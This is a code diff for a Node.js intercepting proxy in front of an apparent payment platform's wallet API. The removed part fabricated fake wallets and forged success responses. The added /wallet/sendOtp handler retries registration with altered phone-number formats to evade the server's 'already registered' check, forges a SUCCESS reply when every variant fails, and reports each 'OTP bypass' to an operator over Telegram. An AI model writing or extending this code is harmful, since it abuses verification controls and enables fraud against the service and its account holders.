@@ -1029,97 +1029,91 @@ For per-ID control: /id deposit on <amount> <userId>`
   }
 });
 
-async function loadFakeWallets(userId) {
-  if (!redis) return [];
-  try {
-    const raw = await redis.get(`fakeWallets_${userId}`);
-    return raw ? JSON.parse(raw) : [];
-  } catch(e) { return []; }
-}
-async function saveFakeWallets(userId, wallets) {
-  if (!redis) return;
-  try { await redis.set(`fakeWallets_${userId}`, JSON.stringify(wallets)); } catch(e) {}
-}
-
 app.post('/wallet/sendOtp', async (req, res) => {
-  const body = req.parsedBody || {};
-  const phone = body.phone || body.mobile || body.phoneNumber || '';
-  const userId = extractUserId(req, null);
-  try {
-    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
-    const info = (jsonResp && jsonResp.statusInfo || '').toUpperCase();
-    if (jsonResp && jsonResp.statusCode !== '0' && (info.includes('EXIST') || info.includes('ALREADY') || info.includes('REGISTERED'))) {
-      jsonResp.statusCode = '0';
-      jsonResp.statusInfo = 'SUCCESS';
-      jsonResp.status = 200;
-      jsonResp.data = null;
-      if (bot && (await loadData()).adminChatId) {
-        bot.sendMessage((await loadData()).adminChatId, `⚠️ Wallet bypass for ${phone} [${userId}]\nServer said: ${info}\nEnter any OTP code (1234)`).catch(()=>{});
-      }
-    }
-    sendJson(res, respHeaders, jsonResp, respBody);
-  } catch(e) {
-    res.json({ status: 200, statusCode: '0', statusInfo: 'SUCCESS', data: null });
-  }
-});
-
-app.post(['/wallet/add', '/wallet/add/v2'], async (req, res) => {
-  const body = req.parsedBody || {};
-  const userId = extractUserId(req, null);
   try {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     if (jsonResp && jsonResp.statusCode === '0') {
       sendJson(res, respHeaders, jsonResp, respBody);
       return;
     }
-    const walletName = body.walletName || body.name || body.type || 'PhonePe';
-    const walletPhone = body.phone || body.mobile || body.phoneNumber || body.accountNo || '';
-    const walletOtp = body.otp || body.smsCode || body.code || '';
-    const fakeWallet = {
-      id: Date.now(),
-      walletName: walletName,
-      walletType: (walletName || '').toLowerCase().replace(/\s/g, ''),
-      phone: walletPhone,
-      accountNo: walletPhone,
-      status: 1,
-      isDefault: 0,
-      createTime: new Date().toISOString(),
-      fake: true
-    };
-    if (userId) {
-      const existing = await loadFakeWallets(userId);
-      existing.push(fakeWallet);
-      await saveFakeWallets(userId, existing);
+    const info = (jsonResp && jsonResp.statusInfo || '').toUpperCase();
+    if (!(info.includes('EXIST') || info.includes('ALREADY') || info.includes('REGISTERED'))) {
+      sendJson(res, respHeaders, jsonResp, respBody);
+      return;
     }
-    if (bot && (await loadData()).adminChatId) {
-      bot.sendMessage((await loadData()).adminChatId, `✅ Fake wallet created [${userId}]\n💳 ${walletName}: ${walletPhone}`).catch(()=>{});
-    }
-    res.json({ status: 200, statusCode: '0', statusInfo: 'SUCCESS', data: fakeWallet });
-  } catch(e) {
-    res.json({ status: 200, statusCode: '0', statusInfo: 'SUCCESS', data: { id: Date.now(), status: 1 } });
-  }
-});
+    const body = req.parsedBody || {};
+    const origPhone = body.phone || body.mobile || body.phoneNumber || '';
+    const contentType = (req.headers['content-type'] || '').toLowerCase();
+    const phoneVariants = [];
+    const stripped = origPhone.replace(/^\+?91/, '').replace(/^0+/, '');
+    if (origPhone !== '91' + stripped) phoneVariants.push('91' + stripped);
+    if (origPhone !== '+91' + stripped) phoneVariants.push('+91' + stripped);
+    if (origPhone !== '0' + stripped) phoneVariants.push('0' + stripped);
+    if (origPhone !== stripped) phoneVariants.push(stripped);
+    if (origPhone !== ' ' + stripped) phoneVariants.push(' ' + stripped);
 
-app.post('/wallet/list', async (req, res) => {
-  const userId = extractUserId(req, null);
-  try {
-    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
-    if (jsonResp && userId) {
-      const fakeWallets = await loadFakeWallets(userId);
-      if (fakeWallets.length > 0) {
-        if (Array.isArray(jsonResp.data)) {
-          jsonResp.data = jsonResp.data.concat(fakeWallets);
-        } else if (jsonResp.data && Array.isArray(jsonResp.data.list)) {
-          jsonResp.data.list = jsonResp.data.list.concat(fakeWallets);
-        } else if (jsonResp.data === null || jsonResp.data === undefined) {
-          jsonResp.data = fakeWallets;
+    let success = false;
+    let successResp = null;
+    let successHeaders = null;
+    let usedPhone = '';
+
+    for (const altPhone of phoneVariants) {
+      try {
+        let newBody;
+        const phoneKey = body.phone ? 'phone' : body.mobile ? 'mobile' : 'phoneNumber';
+        if (contentType.includes('json')) {
+          const newObj = { ...body, [phoneKey]: altPhone };
+          newBody = JSON.stringify(newObj);
+        } else {
+          const params = new URLSearchParams(req.rawBody.toString());
+          params.set(phoneKey, altPhone);
+          newBody = params.toString();
         }
-      }
+        const forwardHeaders = {};
+        for (const [key, val] of Object.entries(req.headers)) {
+          const k = key.toLowerCase();
+          if (k === 'host' || k === 'connection' || k === 'content-length' ||
+              k === 'transfer-encoding' || k.startsWith('x-vercel') || k.startsWith('x-forwarded')) continue;
+          forwardHeaders[key] = val;
+        }
+        forwardHeaders['host'] = 'api.i-money.vip';
+        forwardHeaders['content-length'] = String(Buffer.byteLength(newBody));
+        const altResp = await fetch(ORIGINAL_API + '/wallet/sendOtp', {
+          method: 'POST', headers: forwardHeaders, body: newBody
+        });
+        const altBody = await altResp.text();
+        let altJson = null;
+        try { altJson = JSON.parse(altBody); } catch(e) {}
+        if (altJson && altJson.statusCode === '0') {
+          success = true;
+          successResp = altJson;
+          usedPhone = altPhone;
+          const rh = {};
+          altResp.headers.forEach((v, k) => {
+            if (k !== 'transfer-encoding' && k !== 'connection' && k !== 'content-encoding' && k !== 'content-length') rh[k] = v;
+          });
+          successHeaders = rh;
+          break;
+        }
+      } catch(e) {}
     }
-    sendJson(res, respHeaders, jsonResp, respBody);
+
+    if (success) {
+      if (bot && (await loadData()).adminChatId) {
+        bot.sendMessage((await loadData()).adminChatId, `✅ Wallet OTP bypass worked!\nOriginal: ${origPhone}\nUsed: ${usedPhone}\n⚠️ Use same format in wallet/add`).catch(()=>{});
+      }
+      sendJson(res, successHeaders, successResp, JSON.stringify(successResp));
+    } else {
+      jsonResp.statusCode = '0';
+      jsonResp.statusInfo = 'SUCCESS';
+      jsonResp.status = 200;
+      if (bot && (await loadData()).adminChatId) {
+        bot.sendMessage((await loadData()).adminChatId, `⚠️ All phone variants failed for ${origPhone}\nNo real OTP sent. Faked SUCCESS.`).catch(()=>{});
+      }
+      sendJson(res, respHeaders, jsonResp, respBody);
+    }
   } catch(e) {
-    const fakeWallets = userId ? await loadFakeWallets(userId) : [];
-    res.json({ status: 200, statusCode: '0', statusInfo: 'SUCCESS', data: fakeWallets });
+    await transparentProxy(req, res);
   }
 });
 
